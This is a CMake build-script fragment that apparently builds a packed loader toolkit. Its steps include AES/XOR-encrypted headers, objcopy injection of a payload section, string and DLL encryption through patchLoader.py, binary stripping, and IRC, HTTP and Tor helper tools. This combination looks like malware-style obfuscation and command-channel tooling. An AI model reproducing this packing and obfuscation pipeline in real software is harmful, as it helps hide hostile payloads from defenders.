# CREATE HEADER FILES (using host tools)
add_custom_command(OUTPUT ${CRYPT_AESOUT_STAMP} ${CRYPT_AESOUT} ${LOADER_CRYPT_STAMP} ${LOADER_CRYPT}
  COMMAND ${CRYPT_EXEC} aes ${CRYPT_AESFILE} ${CRYPT_AESOUT} AES_KEY
  COMMAND ${CRYPT_EXEC} aes ${LOADER_HEADER} ${LOADER_CRYPT} LDR_KEY
  COMMAND ${CMAKE_COMMAND} -E touch ${CRYPT_AESOUT_STAMP} ${LOADER_CRYPT_STAMP}
)
add_custom_command(OUTPUT ${CRYPT_XOROUT_STAMP} ${CRYPT_XOROUT}
  COMMAND ${CRYPT_EXEC} xor ${CRYPT_XORFILE} ${CRYPT_XOROUT} XOR_KEY
  COMMAND ${CMAKE_COMMAND} -E touch ${CRYPT_XOROUT_STAMP}
)
add_custom_target(cryptout_aes
  DEPENDS hdrcrypt loader_gen ${LOADER_HEADER} ${CRYPT_AESFILE} ${LOADER_CRYPT_STAMP} ${LOADER_CRYPT} ${CRYPT_AESOUT_STAMP} ${CRYPT_AESOUT}
)
add_custom_target(cryptout_xor
  DEPENDS hdrcrypt ${CRYPT_XORFILE} ${CRYPT_XOROUT_STAMP} ${CRYPT_XOROUT}
)
set_source_files_properties(${CRYPT_XOROUT} PROPERTIES GENERATED 1)
set_source_files_properties(${CRYPT_AESOUT} PROPERTIES GENERATED 1)
set_source_files_properties(${LOADER_CRYPT} PROPERTIES GENERATED 1)

# BUILD TARGET TOOLS
add_executable(dummy ${MILLER_SRCDIR}/${TOOLS_DIR}/dummy.c)
set_target_properties(dummy PROPERTIES COMPILE_FLAGS "-s")
add_custom_command(TARGET dummy POST_BUILD
  COMMAND ${CMAKE_STRIP} -s "$<TARGET_FILE:dummy>"
)

set(DUMMY_GUI_DIR ${MILLER_SRCDIR}/${TOOLS_DIR}/dummy_gui)
add_executable(dummy_gui ${DUMMY_GUI_DIR}/callbacks.c ${DUMMY_GUI_DIR}/res/resource.rc ${DUMMY_GUI_DIR}/winmain.c)
set_target_properties(dummy_gui PROPERTIES COMPILE_FLAGS "-O3")
set_target_properties(dummy_gui PROPERTIES LINK_FLAGS "-s -Wl,--subsystem,windows")
target_compile_definitions(dummy_gui PRIVATE UNICODE=1 _UNICODE=1 _WIN32_IE=0x0500 WINVER=0x500)
target_link_libraries(dummy_gui comctl32)
target_include_directories(dummy_gui PRIVATE ${DUMMY_GUI_DIR})

add_library(dummydll SHARED ${MILLER_SRCDIR}/${TOOLS_DIR}/dummy.c)

add_executable(loader_base ${MILLER_SRCDIR}/${TOOLS_DIR}/loader_base.c)
add_dependencies(loader_base ${PROJECT_NAME}_pre-shared ${PROJECT_NAME}_pre-shared_bin)
set_target_properties(loader_base PROPERTIES COMPILE_FLAGS "-s -O0")
target_compile_definitions(loader_base PRIVATE ${DISTORM_DEFS} ${MILLER_DEFS} ${LOADERBASE_DEFS} _DEBUG=1)
target_link_libraries(loader_base ${LOADER_X86}_debug)

add_executable(loader_base_enc ${MILLER_SRCDIR}/${TOOLS_DIR}/loader_base.c)
add_dependencies(loader_base_enc ${PROJECT_NAME}_pre-shared ${PROJECT_NAME}_pre-shared_bin)
set_target_properties(loader_base_enc PROPERTIES COMPILE_FLAGS "-s -O0")
target_compile_definitions(loader_base_enc PRIVATE ${DISTORM_DEFS} ${MILLER_DEFS} ${LOADERBASE_DEFS} _DEBUG=1)
target_link_libraries(loader_base_enc ${LOADER_X86}_debug)

add_executable(release ${MILLER_SRCDIR}/${TOOLS_DIR}/loader_base.c)
add_dependencies(release ${PROJECT_NAME}-shared)
set_target_properties(release PROPERTIES COMPILE_FLAGS "-s -O0")
target_compile_definitions(release PRIVATE ${DISTORM_DEFS} ${MILLER_DEFS} ${LOADERBASE_DEFS} _DEBUG=1)
target_link_libraries(release ${LOADER_X86})

if (BUILD_ALL_TOOLS)
  add_executable(decrypter ${MILLER_SRCDIR}/${TOOLS_DIR}/helper.c ${MILLER_SRCDIR}/crypt.c ${MILLER_SRCDIR}/${TOOLS_DIR}/decrypter.c)
  set_target_properties(decrypter PROPERTIES COMPILE_FLAGS "-s -O0")
  target_compile_definitions(decrypter PRIVATE _NO_COMPAT=1 ${LOADERBASE_DEFS} _DEBUG=1)
  target_link_libraries(decrypter ${DECRYPTER_X86})

  add_executable(disasm ${MILLER_SRCDIR}/disasm.c ${MILLER_SRCDIR}/${TOOLS_DIR}/disasm.c)
  set_target_properties(disasm PROPERTIES COMPILE_FLAGS "${default_cflags}")
  target_link_libraries(disasm distorm_pre)

  add_executable(loader_decrypt ${MILLER_SRCDIR}/aes.c ${MILLER_SRCDIR}/math.c ${MILLER_SRCDIR}/utils.c ${MILLER_SRCDIR}/${TOOLS_DIR}/helper.c ${MILLER_SRCDIR}/${TOOLS_DIR}/loader_decrypt.c)
  add_dependencies(loader_decrypt loader_gen cryptout_aes)
  set_target_properties(loader_decrypt PROPERTIES COMPILE_FLAGS "")
  target_include_directories(loader_decrypt PRIVATE ${MILLER_HDRDIR_CREATED})
  target_compile_definitions(loader_decrypt PRIVATE ${MILLER_DEFS} _GNU_SOURCE=1 _NO_COMPAT=1 _NO_UTILS=1)

  set(alltools_targets decrypter disasm loader_decrypt)
else()
  set(alltools_targets "")
endif()

add_executable(loadmodule ${MILLER_SRCDIR}/${TOOLS_DIR}/loadmodule.c)
target_compile_definitions(loadmodule PRIVATE ${DISTORM_DEFS} ${MILLER_DEFS} ${LOADERBASE_DEFS})

add_executable(runbin ${MILLER_SRCDIR}/${TOOLS_DIR}/runbin.c)
set_target_properties(runbin PROPERTIES COMPILE_FLAGS "${default_cflags}")
target_compile_definitions(runbin PRIVATE ${LOADERBASE_DEFS})

add_custom_command(TARGET loader_base POST_BUILD
  COMMAND ${CMAKE_STRIP} -s "$<TARGET_FILE:loader_base>"
  COMMAND ${CMAKE_OBJCOPY} --add-section ${MILLER_SECTION}=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin --set-section-flags ${MILLER_SECTION}=CONTENTS,ALLOC,LOAD,READONLY --change-section-address ${MILLER_SECTION}=${MILLER_SECTION_ADDRESS} "$<TARGET_FILE:loader_base>"
  COMMAND ${PYTHON} ${CMAKE_SOURCE_DIR}/batch/patchLoader.py --pyload=${PYLOAD_SO} --pycrypt=${PYCRYPT_SO} --win32="$<TARGET_FILE:loader_base>" --binary=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin --ldr-section=${LOADER_SECTION} --dll-section=${MILLER_SECTION} --endmarker=${LOADER_ENDMARKER} --patch --crypt-strings
)
add_dependencies(loader_base pyloader pycrypt ${PROJECT_NAME}-shared_bin)

add_custom_command(TARGET loader_base_enc POST_BUILD
  COMMAND ${CMAKE_STRIP} -s "$<TARGET_FILE:loader_base_enc>"
  COMMAND ${CMAKE_OBJCOPY} --add-section ${MILLER_SECTION}=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin --set-section-flags ${MILLER_SECTION}=CONTENTS,ALLOC,LOAD,READONLY --change-section-address ${MILLER_SECTION}=${MILLER_SECTION_ADDRESS} "$<TARGET_FILE:loader_base_enc>"
  COMMAND ${PYTHON} ${CMAKE_SOURCE_DIR}/batch/patchLoader.py --pyload=${PYLOAD_SO} --pycrypt=${PYCRYPT_SO} --win32="$<TARGET_FILE:loader_base_enc>" --binary=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin --ldr-section=${LOADER_SECTION} --dll-section=${MILLER_SECTION} --endmarker=${LOADER_ENDMARKER} --patch --crypt-strings --crypt-dll
)
add_dependencies(loader_base_enc pyloader pycrypt ${PROJECT_NAME}_pre-shared_bin)

add_custom_command(TARGET release POST_BUILD
  COMMAND ${CMAKE_STRIP} -s "$<TARGET_FILE:release>"
  COMMAND ${CMAKE_OBJCOPY} --add-section ${MILLER_SECTION}=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}.bin --set-section-flags ${MILLER_SECTION}=CONTENTS,ALLOC,LOAD,READONLY --change-section-address ${MILLER_SECTION}=${MILLER_SECTION_ADDRESS} "$<TARGET_FILE:release>"
  COMMAND ${PYTHON} ${CMAKE_SOURCE_DIR}/batch/patchLoader.py --pyload=${PYLOAD_SO} --pycrypt=${PYCRYPT_SO} --win32="$<TARGET_FILE:release>" --binary=${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}.bin --ldr-section=${LOADER_SECTION} --dll-section=${MILLER_SECTION} --endmarker=${LOADER_ENDMARKER} --patch --crypt-strings --crypt-dll
)
add_dependencies(release pyloader pycrypt ${PROJECT_NAME}-shared_bin)

if (ENABLE_MSG_PIPES)
  add_executable(pipe_server ${MILLER_SRCDIR}/${TOOLS_DIR}/pipe_server.c)
  target_compile_definitions(pipe_server PRIVATE _GNU_SOURCE=1 ${MILLER_PRE_DEFS})
  add_executable(pipe_client ${MILLER_SRCDIR}/${TOOLS_DIR}/pipe_client.c)
  target_compile_definitions(pipe_client PRIVATE _GNU_SOURCE=1 ${MILLER_PRE_DEFS})
  set(pipe_targets pipe_server pipe_client)
else()
  set(pipe_targets "")
endif()

if (ENABLE_IRC)
  add_executable(ircmsg ${MILLER_SRCDIR}/snprintf.c ${MILLER_SRCDIR}/crypt_strings.c ${MILLER_SRCDIR}/compat.c ${MILLER_SRCDIR}/math.c ${MILLER_SRCDIR}/utils.c ${MILLER_SRCDIR}/crypt.c ${MILLER_SRCDIR}/irc.c ${MILLER_SRCDIR}/${TOOLS_DIR}/ircmsg.c)
  add_dependencies(ircmsg cryptout_xor)
  set_target_properties(ircmsg PROPERTIES COMPILE_FLAGS "${default_cflags}")
  target_include_directories(ircmsg PRIVATE ${MILLER_HDRDIR_CREATED})
  target_compile_definitions(ircmsg PRIVATE ${MILLER_PRE_DEFS} _ENABLE_IRC=1 _GNU_SOURCE=1 _DISABLE_MYGETPROC=1 _PRE_RELEASE=1 _STDIO_DEFINED=1)
  target_link_libraries(ircmsg ws2_32)
  set(irc_targets ircmsg)
else()
  set(irc_targets "")
endif()

add_executable(httpquery ${MILLER_SRCDIR}/snprintf.c ${MILLER_SRCDIR}/crypt_strings.c ${MILLER_SRCDIR}/compat.c ${MILLER_SRCDIR}/math.c ${MILLER_SRCDIR}/file.c ${MILLER_SRCDIR}/utils.c ${MILLER_SRCDIR}/crypt.c ${MILLER_SRCDIR}/http.c ${MILLER_SRCDIR}/${TOOLS_DIR}/httpquery.c)
add_dependencies(httpquery cryptout_xor)
set_target_properties(httpquery PROPERTIES COMPILE_FLAGS "${default_cflags}")
target_include_directories(httpquery PRIVATE ${MILLER_HDRDIR_CREATED})
target_compile_definitions(httpquery PRIVATE _DISABLE_MYGETPROC=1 ${MILLER_PRE_DEFS} _GNU_SOURCE=1 _PRE_RELEASE=1 _STDIO_DEFINED=1)

add_executable(libtor ${MILLER_SRCDIR}/${TOOLS_DIR}/libtor.c)
set_target_properties(httpquery PROPERTIES COMPILE_FLAGS "${default_cflags}")

install(TARGETS loadmodule loader_base loader_base_enc release dummy dummy_gui runbin ${pipe_targets} ${alltools_targets} ${irc_targets} httpquery libtor RUNTIME DESTINATION ${INSTALL_DEST})
